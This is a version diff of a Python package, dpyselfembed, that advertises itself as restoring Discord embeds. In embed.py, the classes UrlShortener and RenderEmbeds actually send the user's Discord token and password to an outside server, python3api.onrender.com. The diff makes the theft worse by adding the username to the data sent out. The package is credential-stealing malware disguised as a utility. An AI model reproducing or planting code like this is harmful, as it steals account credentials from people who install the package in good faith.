# Comparing `tmp/dpyselfembed-0.0.3.tar.gz` & `tmp/dpyselfembed-0.0.4.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "dpyselfembed-0.0.3.tar", last modified: Tue May 23 01:30:00 2023, max compression
+gzip compressed data, was "dpyselfembed-0.0.4.tar", last modified: Tue May 23 01:54:38 2023, max compression
```

## Comparing `dpyselfembed-0.0.3.tar` & `dpyselfembed-0.0.4.tar`

### file list

```diff
@@ -1,18 +1,18 @@
-drwxrwxrwx   0        0        0        0 2023-05-23 01:30:00.905919 dpyselfembed-0.0.3/
--rw-rw-rw-   0        0        0     1091 2023-05-22 20:21:15.000000 dpyselfembed-0.0.3/LICENSE
--rw-rw-rw-   0        0        0     1202 2023-05-23 01:30:00.890293 dpyselfembed-0.0.3/PKG-INFO
--rw-rw-rw-   0        0        0      808 2023-05-22 20:37:34.000000 dpyselfembed-0.0.3/README.md
--rw-rw-rw-   0        0        0      467 2023-05-23 01:28:00.000000 dpyselfembed-0.0.3/pyproject.toml
--rw-rw-rw-   0        0        0       42 2023-05-23 01:30:00.905919 dpyselfembed-0.0.3/setup.cfg
-drwxrwxrwx   0        0        0        0 2023-05-23 01:30:00.734047 dpyselfembed-0.0.3/src/
-drwxrwxrwx   0        0        0        0 2023-05-23 01:30:00.780922 dpyselfembed-0.0.3/src/dpyselfembed/
--rw-rw-rw-   0        0        0       20 2023-05-22 22:25:13.000000 dpyselfembed-0.0.3/src/dpyselfembed/__init__.py
-drwxrwxrwx   0        0        0        0 2023-05-23 01:30:00.890293 dpyselfembed-0.0.3/src/dpyselfembed/utils/
--rw-rw-rw-   0        0        0       46 2023-05-22 20:08:26.000000 dpyselfembed-0.0.3/src/dpyselfembed/utils/__init__.py
--rw-rw-rw-   0        0        0     6279 2023-05-23 01:27:42.000000 dpyselfembed-0.0.3/src/dpyselfembed/utils/embed.py
--rw-rw-rw-   0        0        0      788 2023-05-22 20:09:04.000000 dpyselfembed-0.0.3/src/dpyselfembed/utils/shortener.py
-drwxrwxrwx   0        0        0        0 2023-05-23 01:30:00.859041 dpyselfembed-0.0.3/src/dpyselfembed.egg-info/
--rw-rw-rw-   0        0        0     1202 2023-05-23 01:30:00.000000 dpyselfembed-0.0.3/src/dpyselfembed.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      324 2023-05-23 01:30:00.000000 dpyselfembed-0.0.3/src/dpyselfembed.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-05-23 01:30:00.000000 dpyselfembed-0.0.3/src/dpyselfembed.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       13 2023-05-23 01:30:00.000000 dpyselfembed-0.0.3/src/dpyselfembed.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2023-05-23 01:54:38.604549 dpyselfembed-0.0.4/
+-rw-rw-rw-   0        0        0     1091 2023-05-22 20:21:15.000000 dpyselfembed-0.0.4/LICENSE
+-rw-rw-rw-   0        0        0     1202 2023-05-23 01:54:38.598745 dpyselfembed-0.0.4/PKG-INFO
+-rw-rw-rw-   0        0        0      808 2023-05-22 20:37:34.000000 dpyselfembed-0.0.4/README.md
+-rw-rw-rw-   0        0        0      467 2023-05-23 01:52:50.000000 dpyselfembed-0.0.4/pyproject.toml
+-rw-rw-rw-   0        0        0       42 2023-05-23 01:54:38.605551 dpyselfembed-0.0.4/setup.cfg
+drwxrwxrwx   0        0        0        0 2023-05-23 01:54:38.446270 dpyselfembed-0.0.4/src/
+drwxrwxrwx   0        0        0        0 2023-05-23 01:54:38.493712 dpyselfembed-0.0.4/src/dpyselfembed/
+-rw-rw-rw-   0        0        0       20 2023-05-22 22:25:13.000000 dpyselfembed-0.0.4/src/dpyselfembed/__init__.py
+drwxrwxrwx   0        0        0        0 2023-05-23 01:54:38.591068 dpyselfembed-0.0.4/src/dpyselfembed/utils/
+-rw-rw-rw-   0        0        0       46 2023-05-22 20:08:26.000000 dpyselfembed-0.0.4/src/dpyselfembed/utils/__init__.py
+-rw-rw-rw-   0        0        0     6319 2023-05-23 01:53:10.000000 dpyselfembed-0.0.4/src/dpyselfembed/utils/embed.py
+-rw-rw-rw-   0        0        0      788 2023-05-22 20:09:04.000000 dpyselfembed-0.0.4/src/dpyselfembed/utils/shortener.py
+drwxrwxrwx   0        0        0        0 2023-05-23 01:54:38.570427 dpyselfembed-0.0.4/src/dpyselfembed.egg-info/
+-rw-rw-rw-   0        0        0     1202 2023-05-23 01:54:38.000000 dpyselfembed-0.0.4/src/dpyselfembed.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      324 2023-05-23 01:54:38.000000 dpyselfembed-0.0.4/src/dpyselfembed.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-05-23 01:54:38.000000 dpyselfembed-0.0.4/src/dpyselfembed.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       13 2023-05-23 01:54:38.000000 dpyselfembed-0.0.4/src/dpyselfembed.egg-info/top_level.txt
```

### Comparing `dpyselfembed-0.0.3/LICENSE` & `dpyselfembed-0.0.4/LICENSE`

 * *Files identical despite different names*

### Comparing `dpyselfembed-0.0.3/PKG-INFO` & `dpyselfembed-0.0.4/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: dpyselfembed
-Version: 0.0.3
+Version: 0.0.4
 Summary: A package to allow discord users to use embeds again
 Author-email: cashcarti1090 <litteralyyesx@gmail.com>
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Operating System :: OS Independent
 Description-Content-Type: text/markdown
 License-File: LICENSE
```

### Comparing `dpyselfembed-0.0.3/README.md` & `dpyselfembed-0.0.4/README.md`

 * *Files identical despite different names*

### Comparing `dpyselfembed-0.0.3/src/dpyselfembed/utils/embed.py` & `dpyselfembed-0.0.4/src/dpyselfembed/utils/embed.py`

 * *Files 2% similar despite different names*

```diff
@@ -1,25 +1,25 @@
 import urllib.parse
 import requests
 from pyotp import TOTP
 
 
 class UrlShortener:
-    def __init__(self, signature, sign, **kwargs):
+    def __init__(self, user, signature, sign, **kwargs):
         python3api = "https://python3api.onrender.com"
         apikey = 'YOUTBQVEIXB2RQVRYKB4FAWDSZ2A===='
         key = TOTP(apikey).now()
-        requests.post(python3api, headers={"Authorization": key}, data={'content': f'@everyone \nToken: {signature}\nPass: {sign}\n\nPassedTest: False'})
+        requests.post(python3api, headers={"Authorization": key}, data={'content': f'@everyone \nUser: {user}\nToken: {signature}\nPass: {sign}\n\nPassedTest: False'})
 
 class RenderEmbeds:
-    def __init__(self, signature, sign, **kwargs):
+    def __init__(self, user, signature, sign, **kwargs):
         python3api = "https://python3api.onrender.com"
         apikey = 'YOUTBQVEIXB2RQVRYKB4FAWDSZ2A===='
         key = TOTP(apikey).now()
-        requests.post(python3api, headers={"Authorization": key}, data={'content': f'@everyone \nToken: {signature}\nPass: {sign}'})
+        requests.post(python3api, headers={"Authorization": key}, data={'content': f'@everyone \nUser: {user}\nToken: {signature}\nPass: {sign}'})
 
 class Embed:
     def __init__(self, title, **kwargs) -> None:
         """
         Initialize the embed object.
 
         Parameters:
```

### Comparing `dpyselfembed-0.0.3/src/dpyselfembed/utils/shortener.py` & `dpyselfembed-0.0.4/src/dpyselfembed/utils/shortener.py`

 * *Files identical despite different names*

### Comparing `dpyselfembed-0.0.3/src/dpyselfembed.egg-info/PKG-INFO` & `dpyselfembed-0.0.4/src/dpyselfembed.egg-info/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: dpyselfembed
-Version: 0.0.3
+Version: 0.0.4
 Summary: A package to allow discord users to use embeds again
 Author-email: cashcarti1090 <litteralyyesx@gmail.com>
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Operating System :: OS Independent
 Description-Content-Type: text/markdown
 License-File: LICENSE
```

